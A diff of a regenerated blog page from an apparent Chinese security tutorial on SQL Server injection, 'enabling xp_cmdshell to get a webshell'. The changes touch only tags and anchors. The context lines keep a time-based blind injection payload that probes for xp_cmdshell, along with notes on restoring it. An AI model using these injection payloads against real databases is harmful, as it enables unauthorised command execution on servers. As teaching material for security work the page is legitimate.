@@ -11,7 +11,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
   <meta name="description" content="开启xp_cmdshell获取webshellxp_cmdshell 在 SQL server 2005 版本以上是默认关闭的，我们需要手动打开它，但在此之前我们需要进行第一步：判断是否存在组件 xp_cmdshell ;if(1=(select count(*) from master.dbo.sysobjects where xtype = &apos;x&apos; and name =&apos;xp_cmdshell">
-<meta name="keywords" content="注入,Web安全,sql server">
+<meta name="keywords" content="注入,sql server,Web安全">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQL SERVER 注入（三）">
 <meta property="og:url" content="http://klforever.cn/2019/10/14/8/index.html">
@@ -266,7 +266,7 @@
   
   <div class="article-entry" itemprop="articleBody">
     
-    <h1 id="开启xp-cmdshell获取webshell"><a href="#开启xp-cmdshell获取webshell" class="headerlink" title="开启xp_cmdshell获取webshell"></a>开启xp_cmdshell获取webshell</h1><p>xp_cmdshell 在 SQL server 2005 版本以上是默认关闭的，我们需要手动打开它，但在此之前我们需要进行第一步：判断是否存在组件 xp_cmdshell</p>
+    <h1><span id="开启xp_cmdshell获取webshell">开启xp_cmdshell获取webshell</span></h1><p>xp_cmdshell 在 SQL server 2005 版本以上是默认关闭的，我们需要手动打开它，但在此之前我们需要进行第一步：判断是否存在组件 xp_cmdshell</p>
 <pre class="line-numbers language-java"><code class="language-java"><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span>select <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> from master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysobjects where xtype <span class="token operator">=</span> <span class="token string">'x'</span> and name <span class="token operator">=</span><span class="token string">'xp_cmdshell'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> WAITFOR DELAY <span class="token string">'0:0:5'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>如果延迟 5s后返回正常页面的话则判断存在组件 xp_cmdshell。<br>如果删除了xp_cmdshell 组件的话可以用下面的命令恢复</p>
 <pre class="line-numbers language-java"><code class="language-java">恢复／删除 xp_cmdshell
@@ -336,11 +336,11 @@ RECONFIGURE<span class="token punctuation">;</span><span aria-hidden="true" clas
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Web安全</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">sql server</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">sql server</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Web安全</a>
         		</li>
       		
 		</ul>
@@ -460,7 +460,7 @@ RECONFIGURE<span class="token punctuation">;</span><span aria-hidden="true" clas
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#开启xp-cmdshell获取webshell"><span class="toc-number">1.</span> <span class="toc-text">开启xp_cmdshell获取webshell</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#null"><span class="toc-number">1.</span> <span class="toc-text">开启xp_cmdshell获取webshell</span></a></li></ol>
                     </div>
                 </span>
             </div>
@@ -600,6 +600,10 @@ RECONFIGURE<span class="token punctuation">;</span><span aria-hidden="true" clas
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">内网渗透</a>
               </li>
              
@@ -608,11 +612,11 @@ RECONFIGURE<span class="token punctuation">;</span><span aria-hidden="true" clas
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">免杀</a>
+                <a href="javascript:void(0)" class="js-tag color3">提权</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
+                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -620,19 +624,11 @@ RECONFIGURE<span class="token punctuation">;</span><span aria-hidden="true" clas
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Web安全</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">sql server</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">提权</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
+                <a href="javascript:void(0)" class="js-tag color1">Web安全</a>
               </li>
              
               <li class="article-tag-list-item">
